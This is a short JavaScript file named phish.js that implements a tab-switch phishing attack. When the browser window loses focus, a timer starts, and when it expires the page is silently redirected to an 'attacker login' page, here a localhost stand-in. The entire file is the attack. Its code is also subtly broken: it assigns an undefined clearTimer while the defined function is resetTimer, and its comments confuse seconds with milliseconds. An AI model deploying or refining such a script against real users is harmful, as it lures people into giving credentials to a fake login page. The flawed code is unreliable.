/* File: phish.js
 * Description: Redirects current window to attacker server
 * after TIME amount of seconds of window inactivity. 
 */


/* 	Global Variables  */
var dt;										// Time duration flag
var TIME = 1000;							// Time limit in milliseconds

/*
 *	Window Event Attributes
 *	
 *	initiateTimer()
 *	When the window element loses focus, initiateTimer
 *	will be called and begin counting TIME.
 *
 *	resetTimer()
 *	When the window element gains focus, resetTimer 
 *	will be called and will reset the time flag. 
 *
 */
window.onblur = initiateTimer;
window.onfocus = clearTimer; 

function initiateTimer() {
	dt = setTimeout(reRoute, TIME);			// Wait TIME seconds of inactivity
}

function resetTimer() {
	if (dt != 0)
		clearTimeout(dt);	
}

/*
 * reRoute
 *
 * The function is called when the tab has been
 * out of focus for set time. The current webpage
 * is rerouted to attacker's server
 *
 */
function reRoute(){
	window.location.href = 
		"http://localhost:8888/attackerlogin";	
}

